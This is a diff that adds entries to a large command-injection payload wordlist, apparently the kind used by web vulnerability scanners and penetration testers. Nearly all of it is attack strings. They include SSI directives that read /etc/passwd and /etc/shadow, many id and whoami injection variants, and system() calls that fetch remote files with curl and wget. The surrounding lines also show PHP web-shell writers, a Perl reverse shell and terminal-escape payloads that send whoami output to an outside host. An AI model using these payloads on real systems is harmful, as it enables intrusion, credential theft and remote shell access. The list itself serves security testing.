@@ -7280,6 +7280,9 @@ ${system(print(`echo%20ZYLUET`.`echo%20$((5%2B56))`.`echo%20ZYLUET`.`echo%20ZYLU
 &echo%20ZJVXWJ$((77%2B27))$(echo%20ZJVXWJ)ZJVXWJ"
 &echo%20ZMZTLJ$((97%2B61))$(echo%20ZMZTLJ)ZMZTLJ%26
 &ls;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
 '
 ' & whoami
 ' && whoami
@@ -7860,6 +7863,7 @@ ${system(print(`echo%20ZYLUET`.`echo%20$((5%2B56))`.`echo%20ZYLUET`.`echo%20ZYLU
 ; echo "<?php system($_GET['cmd']); ?>" > cmd.php
 ; echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
 ; echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
+; id
 ; ifconfig
 ; ipconfig /all
 ; ls -l /
@@ -7898,6 +7902,7 @@ ${system(print(`echo%20ZYLUET`.`echo%20$((5%2B56))`.`echo%20ZYLUET`.`echo%20ZYLU
 ; wget https://crowdshield.com/.testing/rce_vuln.txt
 ; whoami
 ;${@print(md5(RCEVulnerable))};
+;/usr/bin/id\n
 ;/usr/bin/id|
 ;echo '<script>alert(1)</script>'
 ;echo$IFSAQHLIY$((38%2B77))$(echo$IFSAQHLIY)AQHLIY%2F%2F
@@ -8049,7 +8054,9 @@ ${system(print(`echo%20ZYLUET`.`echo%20$((5%2B56))`.`echo%20ZYLUET`.`echo%20ZYLU
 ;netstat -a;
 ;phpinfo()
 ;phpinfo();//
+;system('/usr/bin/id')
 ;system('cat%20/etc/passwd')
+;system('id')
 ;uname;
 ;{$_GET["cmd"]}
 ;|/usr/bin/id|
@@ -8066,7 +8073,9 @@ ${system(print(`echo%20ZYLUET`.`echo%20$((5%2B56))`.`echo%20ZYLUET`.`echo%20ZYLU
 <?php system("wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc");?>
 \n
 \n/bin/ls -al\n
+\n/usr/bin/id;
 \n/usr/bin/id\n
+\n/usr/bin/id|
 \n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`
 \n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`
 \necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n
@@ -8078,12 +8087,29 @@ ${system(print(`echo%20ZYLUET`.`echo%20$((5%2B56))`.`echo%20ZYLUET`.`echo%20ZYLU
 \r
 \r\n
 `
+`/usr/bin/id`
 `id`
 `ls`
 `ping 127.0.0.1`
+a);/usr/bin/id
+a);/usr/bin/id;
+a);/usr/bin/id|
+a);id
+a);id;
+a);id|
+a)|/usr/bin/id
+a)|/usr/bin/id;
+a)|id
+a)|id;
+a;/usr/bin/id
+a;/usr/bin/id;
+a;/usr/bin/id|
+a;id
 a;id;
 a;id\n
 a;id|
+a|/usr/bin/id
+a|id
 a|id|
 cat /etc/hosts
 cat /etc/passwd
@@ -8319,6 +8345,7 @@ system('cat config.php');
 system('curl https://crowdshield.com/.testing/rce_vuln.txt')
 system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf')
 system('curl https://sn1persecurity.com/.testing/rce_vuln.txt');
+system('curl https://xerosecurity.com/.testing/rce_vuln.txt');
 system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
 system('ls')
 system('pwd')
@@ -8327,6 +8354,7 @@ system('sleep 5')
 system('sleep 5');
 system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23')
 system('wget https://sn1persecurity.com/.testing/rce_vuln.txt');
+system('wget https://xerosecurity.com/.testing/rce_vuln.txt');
 system('whoami')
 system('whoami');
 systeminfo
@@ -8418,7 +8446,9 @@ whoami
 | whoami
 |%20echo%20DLVBOK$((16%2B62))$(echo%20DLVBOK)DLVBOK
 |%20echo%20USBVMG$((4%2B90))$(echo%20USBVMG)USBVMG
+|/bin/ls -al
 |/usr/bin/id
+|/usr/bin/id|
 |echo$IFSAMCJYH$((20%2B48))$(echo$IFSAMCJYH)AMCJYH%5C%5C
 |echo$IFSBHTKLO$((25%2B57))$(echo$IFSBHTKLO)BHTKLO\
 |echo$IFSBTKIBL$((76%2B11))$(echo$IFSBTKIBL)BTKIBL"
@@ -8562,7 +8592,11 @@ whoami
 |echo%20YSISTZ$((83%2B82))$(echo%20YSISTZ)YSISTZ%2F%2F
 |echo%20ZZWTRH$((46%2B12))$(echo%20ZZWTRH)ZZWTRH//
 |id
+|id;
+|id|
 |ls;
+|nid\n
+|usr/bin/id\n
 ||
 || perl -e 'print "X"x16096'
 || perl -e 'print "X"x4096'
@@ -8572,6 +8606,8 @@ whoami
 || sleep 15
 || system('curl https://crowdshield.com/.testing/rce_vuln.txt');
 || system('sleep 5');
+||/usr/bin/id;
+||/usr/bin/id|
 ||echo$IFSANCXJL$((61%2B40))$(echo$IFSANCXJL)ANCXJL//
 ||echo$IFSAOIEWW$((12%2B22))$(echo$IFSAOIEWW)AOIEWW%2F%2F
 ||echo$IFSBCZPXJ$((39%2B35))$(echo$IFSBCZPXJ)BCZPXJ%27
